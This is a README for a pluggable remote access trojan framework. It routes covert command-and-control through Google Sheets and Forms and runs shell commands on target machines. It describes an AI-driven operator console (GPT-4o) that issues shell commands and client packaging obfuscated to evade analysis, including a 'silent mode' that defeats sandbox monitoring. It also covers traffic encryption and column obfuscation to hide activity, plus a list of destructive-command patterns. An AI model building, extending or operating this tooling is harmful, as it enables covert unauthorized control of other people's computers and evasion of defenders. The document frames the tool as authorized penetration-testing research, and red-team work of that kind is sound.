# SaaS RAT — A Pluggable Remote Access Framework

A framework for building covert remote access tools that route command-and-control traffic through legitimate SaaS platforms. The pluggable architecture supports swappable channels, encryption methods, and fragmentation strategies — allowing operators to adapt the transport layer without changing the core.

**Currently implemented channel: Google Sheets.** Commands are dispatched through a shared spreadsheet. The client polls for tasks, executes them, and writes results back. An AI-powered operator console (GPT-4o) translates natural language into commands and interprets results in real time. All traffic goes to `docs.google.com`.

Built for security research and authorized penetration testing in controlled lab environments.

---

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                  Google Sheets                      │
│                                                     │
│              ┌──────────┐   ┌──────────────┐        │
│              │  inbox   │   │   outbox     │        │
│              │ (tasks)  │   │  (results)   │        │
│              └──────────┘   └──────────────┘        │
└──────────────────────┬──────────────┬───────────────┘
                       │              │
          Forms POST   │              │   Forms POST
          (write)      │              │   (write)
                       │              │
            ┌──────────▼──┐      ┌────▼──────────┐
            │   server.py │      │   client.py   │
            │             │      │               │
            │  send       │      │  cycle loop   │
            │  collect    │      │  execute      │
            │  ai (GPT4o) │      │  heartbeat    │
            └─────────────┘      └───────────────┘
```

**Communication flow:**

- Server writes tasks → inbox tab via Google Forms POST
- Client reads inbox → CSV export (unauthenticated read)
- Client writes results → outbox tab via Google Forms POST
- Server reads outbox → CSV export

All traffic goes to `docs.google.com`. Google Forms is the only unauthenticated append endpoint for Google Sheets — no API keys or OAuth required on the client.

---

## File Structure

```
sheets-c2/
├── client.py            # Polling agent — reads tasks, executes, writes results
├── server.py            # Operator interface — send, collect, AI console
├── common.py            # Shared utilities — encryption, fragmentation, channel registry
├── system_prompt.txt    # GPT-4o system prompt — edit to change AI behavior
├── setup_wizard.py      # Interactive setup wizard — writes .env step by step
├── channel/
│   ├── base.py          # Abstract Channel interface + refresh interval management
│   └── sheets.py        # Google Sheets/Forms implementation (SheetsChannel)
├── crypto/
│   ├── base.py          # Abstract Encryptor class
│   ├── plaintext.py     # Pass-through (no encryption, default)
│   └── fernet.py        # AES-128-CBC + HMAC-SHA256 via cryptography.Fernet
├── fragmenter/
│   ├── base.py          # Abstract Fragmenter class
│   ├── passthrough.py   # No fragmentation (default)
│   └── fixed.py         # Fixed-size chunks (FRAGMENT_CHUNK_SIZE bytes)
├── wizard/
│   ├── core.py          # Shared prompt utilities (ask, ask_yn, ask_choice, ...)
│   ├── channel/         # Channel setup wizards (SheetsWizard — auto + manual)
│   ├── crypto/          # Encryption setup wizards (PlaintextWizard, FernetWizard)
│   └── fragmenter/      # Fragmentation setup wizards (PassthroughWizard, FixedWizard)
├── ideas/               # Design docs for planned features
├── .env                 # Runtime config (not committed)
├── .env.example         # Template with all required and optional keys
└── requirements.txt     # Python dependencies
```

---

## Client Packaging

`packager.py` builds a standalone client binary using PyInstaller or Nuitka. No Python required on the target machine. Config is read from environment variables at runtime — nothing is baked in.

```bash
python packager.py
```

### Obfuscation profiles

| Profile | How | Reversibility |
|---------|-----|---------------|
| `basic` | PyInstaller `--onefile` | pyinstxtractor + bytecode decompiler |
| `upx` | PyInstaller + UPX compression | Must `upx -d` before Python layer is accessible |
| `pyarmor` | PyArmor encryption + PyInstaller | Encrypted bytecode — pyarmor_runtime .so required to decrypt |
| `nuitka` | Nuitka → native C binary | No Python bytecode — requires disassembler |

All profiles support **silent mode** (strips all console output — defeats sandbox stdout monitoring).

### Packaging prerequisites

```bash
pip install PyInstaller pyarmor nuitka   # Python deps
sudo apt install upx patchelf            # System deps (Linux)
```

> **Note:** Do not run `strip` or UPX on Nuitka `--onefile` binaries — it corrupts the bootstrap and causes a segfault.

---

## Prerequisites

**Core (server + client):**
- Python 3.9+
- A Google account
- Internet access to `docs.google.com`

**AI console only:**
- An OpenAI API key (`server.py ai`)

**Docker client:**
- Docker + Docker Compose (`docker compose up --build`)

**Client packaging (`packager.py`):**
- See [Packaging prerequisites](#packaging-prerequisites)

---

## Installation

```bash
git clone <repo>
cd sheets-c2
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Setup

The recommended path is the interactive setup wizard. It creates the Google Sheet and Forms automatically via an Apps Script, then writes your `.env`.

```bash
python setup_wizard.py
```

The wizard walks through:
1. **Encryption** — plaintext (debug) or Fernet (recommended)
2. **Column obfuscation** — optional random column names to obscure sheet structure
3. **Channel setup** — auto (Apps Script) or manual (step-by-step browser)
4. **Fragmentation** — passthrough or fixed-size chunks
5. **Extras** — OpenAI API key, custom client ID
6. **Summary** — review and write `.env`

### Auto setup (Apps Script)

The wizard writes `sheets_c2_setup.gs`. Paste it into [script.google.com](https://script.google.com), run `setup()`, copy the JSON from the execution log, and paste it back. The wizard writes your `.env` automatically.

The wizard also writes `sheets_c2_cleanup.gs` — a script that deletes all data rows (keeps headers) from inbox and outbox. Run `cleanupAll()` manually or `installTrigger()` to automate it on a schedule.

### Manual setup

If you prefer to create the sheet and forms by hand, choose manual mode in the wizard or refer to the sections below.

---

## Manual Google Sheets Setup

Create one spreadsheet with **two tabs**: `inbox` and `outbox`. Share it as **"Anyone with the link can view"** — required for unauthenticated CSV export.

### Tab: `inbox`

Default column headers (use as-is, or rename to random names — see [Column Obfuscation](#column-name-obfuscation)):

`command_id`, `command`, `payload`, `target`, `status`, `created_at`

### Tab: `outbox`

Default column headers:

`command_id`, `client_id`, `status`, `result`, `timestamp`

> **Note:** When linking a Google Form to a sheet, Forms auto-creates a new tab. Re-check `?gid=` values after linking — the linked tab has a different GID than your original empty tab. The auto-added `Timestamp` column should be renamed to `form_timestamp` to avoid collision.

---

## Manual Google Forms Setup

Two forms required — one per tab.

### Outbox Form (client → server, links to `outbox` tab)

Fields: `command_id`, `client_id`, `status`, `result`, `timestamp`

### Inbox Form (server → client, links to `inbox` tab)

Fields: `command_id`, `command`, `payload`, `target`, `status`, `created_at`

**Getting entry IDs:** Open the form preview → right-click → View Page Source → search `entry.`. Each field has a unique `entry.XXXXXXXXX` ID. These are required for `FORMS_FIELD_MAP` and never change even if you rename field labels.

---

## Configuration

Copy `.env.example` to `.env` and fill in all values. The setup wizard does this for you.

```env
# Google Sheets
SPREADSHEET_ID=          # From sheet URL: /d/<ID>/edit
INBOX_GID=               # ?gid=X when inbox tab is selected
OUTBOX_GID=              # ?gid=X when outbox tab is selected

# Google Forms — Outbox (client writes results here)
FORMS_URL=               # Outbox form URL ending in /formResponse
FORMS_FIELD_MAP=         # JSON: {"command_id":"entry.X","client_id":"entry.X",...}

# Google Forms — Inbox (server writes commands here)
INBOX_FORMS_URL=         # Inbox form URL ending in /formResponse
INBOX_FORMS_FIELD_MAP=   # JSON: {"command_id":"entry.X","command":"entry.X",...}

# Encryption
ENCRYPTION_METHOD=       # "plaintext" (default) or "fernet"
ENCRYPTION_KEY=          # Fernet key — generate with: python crypto/fernet.py

# Column obfuscation (optional)
INBOX_COLUMN_MAP=        # JSON: {"command_id":"f3a7k","command":"x9m2p",...}
OUTBOX_COLUMN_MAP=       # JSON: {"command_id":"p7c4s","client_id":"m1z8e",...}

# Fragmentation
FRAGMENT_METHOD=         # "passthrough" (default) or "fixed"
FRAGMENT_CHUNK_SIZE=     # bytes per chunk when using "fixed" (default 2000)

# OpenAI
OPENAI_API_KEY=          # Required for ai mode only

# Client
CLIENT_ID=               # Client identifier (default: NADAV)
```

---

## Usage

### CLI help

```bash
python server.py --help
```

### Start the client

Run on the target machine:

```bash
source venv/bin/activate
python client.py
```

The client sends a heartbeat on startup and every 100 cycles (configurable via `heartbeat_every`). Each heartbeat includes system info and the client's current cycle timing — the server uses this to automatically sync its refresh interval. All config is in-memory and resets on restart.

### Dispatch a command

```bash
python server.py send --command system_info
python server.py send --command echo --payload '{"msg": "hello"}'
python server.py send --command shell --payload '{"cmd": "whoami"}'
python server.py send --command config --payload '{"cycle_interval_sec": "60", "client_id": "agent-01"}'
```

### Read results

```bash
python server.py collect
python server.py collect --id <command_id>
```

### AI operator console

```bash
python server.py ai
```

Type commands in plain English. GPT-4o translates them into structured actions, dispatches to the client, and interprets results as they arrive.

> **AI disclaimer:** GPT-4o is non-deterministic — the same prompt may produce different commands across sessions, and the model can misinterpret ambiguous instructions. Always review proposed commands before execution. Use `mode confirm` (the default) when in doubt — it shows the exact command that will be sent and requires explicit approval before dispatch. Commands matching destructive patterns (`rm -rf`, `kill -9`, `dd`, `mkfs`, `shutdown`) are always intercepted and require confirmation regardless of mode.

---

## AI Console Reference

### In-session help

```
> help
```

Prints all local REPL commands. Never sent to the AI.

### Send mode

| Command | Effect |
|---------|--------|
| `mode auto` | Send commands immediately without confirmation |
| `mode confirm` | Preview and confirm before each send (default) |
| `mode` | Show current mode |

### Output mode

| Command | Effect |
|---------|--------|
| `output raw` | Display raw stdout directly |
| `output interpreted` | GPT-4o summarizes results (default) |
| `output` | Show current mode |

### Server refresh interval

The server's background poller re-reads the outbox on a configurable interval. By default it starts at 5s and auto-syncs to the client's cycle timing once the first heartbeat arrives.

| Command | Effect |
|---------|--------|
| `refresh <sec>` | Override refresh interval manually — pauses heartbeat sync |
| `refresh auto` | Clear override — sync back to client heartbeat timing |
| `refresh` | Show current interval and whether it is manual or heartbeat-synced |

### Shortcuts

| Input | Effect |
|-------|--------|
| `do it` / `yes` / `go` | Execute the last AI-suggested command |
| `raw` / `exact` / `full output` | Print raw stdout of the most recent result |
| `?` / `show` / `results` | Show any arrived-but-unseen results |
| `exit` / `quit` | Exit the console |

### Destructive commands

Commands matching patterns like `rm -rf`, `kill -9`, `shutdown`, `dd`, `mkfs` are flagged with a warning and always require explicit confirmation regardless of mode.

### Customizing AI behavior

Edit `system_prompt.txt` — loaded fresh at each `server.py ai` session.

---

## Available Commands

| Command | Payload | Description |
|---------|---------|-------------|
| `system_info` | none | OS, hostname, architecture, username, Python version |
| `echo` | `{"msg": "..."}` | Returns payload as-is |
| `shell` | `{"cmd": "..."}` | Runs a shell command; optional `"stdin"` for interactive input |
| `config` | see below | Updates client cycle config in-memory; resets on restart |

### Config keys

| Key | Default | Description |
|-----|---------|-------------|
| `cycle_interval_sec` | `1` | Base sleep between client cycles (seconds) |
| `cycle_jitter_min` | `2` | Minimum random jitter added per cycle (seconds) |
| `cycle_jitter_max` | `3` | Maximum random jitter added per cycle (seconds) |
| `heartbeat_every` | `5` | Send a heartbeat every N cycles |
| `client_id` | `NADAV` | Client identifier reported in results |

Only listed keys are accepted — unknown keys are silently ignored. All changes are in-memory; re-send config after client restart.

**Shell handler notes:**
- 30 second timeout — hanging commands return a timeout error
- `stdin` defaults to `/dev/null` to prevent interactive prompts from blocking
- If `cmd` contains `| sudo -S`, the `stdin` field is ignored to avoid conflict

---

## Encryption

Applied transparently at the channel boundary. All field values are encrypted before writing and decrypted after reading. Handlers, AI layer, and server dispatch always work with plaintext.

| `ENCRYPTION_METHOD` | Description |
|---------------------|-------------|
| `plaintext` (default) | No encryption — cleartext values in sheet |
| `fernet` | AES-128-CBC + HMAC-SHA256, key from `ENCRYPTION_KEY` |

The setup wizard generates the Fernet key automatically and writes it to `.env`. To generate one manually:

```bash
python crypto/fernet.py
```

Both machines must use the same method and key. Rows that fail decryption pass through as-is — existing plaintext rows remain readable when switching methods.

**Note on command_id correlation:** Fernet is non-deterministic — the same value encrypted twice produces different ciphertext. All `command_id` comparisons happen after decryption, so this is never a problem.

---

## Fragmentation

Large results are split into fixed-size chunks, one chunk sent per client cycle. Keeps individual HTTP requests below Google Forms' ~4000 character field limit.

| `FRAGMENT_METHOD` | Description |
|-------------------|-------------|
| `passthrough` (default) | No fragmentation — result sent in a single write |
| `fixed` | Split into `FRAGMENT_CHUNK_SIZE` byte chunks (default 2000) |

Fragments use `status="frag:N:T"`. Reassembly is in-memory on every full-tab read — no persistence needed since CSV export returns all rows. The send queue is lost on client restart.

---

## Column Name Obfuscation

Replaces logical column headers (`command_id`, `status`, etc.) with short random strings. Values can still be encrypted independently — the two features compose.

| `ENCRYPTION_METHOD` | Column maps set | Sheet appearance |
|---------------------|-----------------|------------------|
| `plaintext` | No | Readable names, cleartext values — debug mode |
| `plaintext` | Yes | Random names, cleartext values |
| `fernet` | No | Readable names, encrypted values |
| `fernet` | Yes | Random names, encrypted values — full production mode |

**Setup:** The wizard generates the maps and displays the names to use when creating the sheet and forms. If setting up manually, choose random short strings, rename all form field labels and sheet column headers to match, then add the maps to `.env` on both machines.

> Entry IDs (`entry.XXXXXXXXX`) in `FORMS_FIELD_MAP` do not change when you rename field labels.

---

## Server Refresh Interval

The server's background thread reads the outbox on a repeating interval — the **refresh interval**. This is distinct from the **client cycle interval** (how often the client wakes up).

- Default: 5s (fast enough for prompt result visibility; cheap CSV read)
- Auto-sync: the first heartbeat from the client carries `cycle_interval_sec`; the server sets its refresh interval to match automatically
- Manual override: `refresh <sec>` in the AI console; `refresh auto` to revert

The refresh interval is re-queried on every server cycle, so changes take effect immediately.

---

## Limitations

- Google Forms is append-only — inbox and outbox grow until manually cleared (use `sheets_c2_cleanup.gs`)
- Result fields truncated at ~4000 characters (Google Forms field size limit)
- **Background result pollers time out after 5 minutes.** When a command is sent, the server spawns a background thread that watches the outbox for a matching result. If no result arrives within 5 minutes — because the client is offline, slow, or the command is long-running — the thread stops watching. The result is **not lost** (it will appear in the sheet when the client eventually responds), but it won't surface automatically. Retrieve it manually with `server.py collect --id <command_id>`.
- **Single client per spreadsheet** — multi-client routing is not implemented. The `target` and `client_id` fields exist in the sheet schema but the server always broadcasts to all clients and collects from all clients indiscriminately. Running two clients (e.g. local + Docker) against the same sheet means every command executes on both and you get two results back. This is a known limitation — multi-client routing is planned (see `ideas/pluggable_channels.md`). For now: run one client at a time.
- The `form_timestamp` column added by Google Forms cannot be removed and is always visible

---

## Roadmap

See `ideas/` for detailed design docs.

| Feature | Status |
|---------|--------|
| Pluggable channel abstraction | Done |
| Fernet encryption | Done |
| Fixed-size fragmentation | Done |
| Column obfuscation | Done |
| Setup wizard (auto + manual) | Done |
| Self-synchronising server refresh interval | Done |
| `switch_channel` command (mid-op channel pivot) | Planned |
| `switch_encryption` command (change crypto mid-op) | Planned |
| `switch_fragmenter` command (change fragmentation mid-op) | Planned |
| Firebase backend | Planned |
| Multi-client routing via `target` field | Planned |
| Client packaging (basic, UPX, PyArmor, Nuitka profiles) | Done |
| `load_module` command (exec-over-the-wire) | Planned |
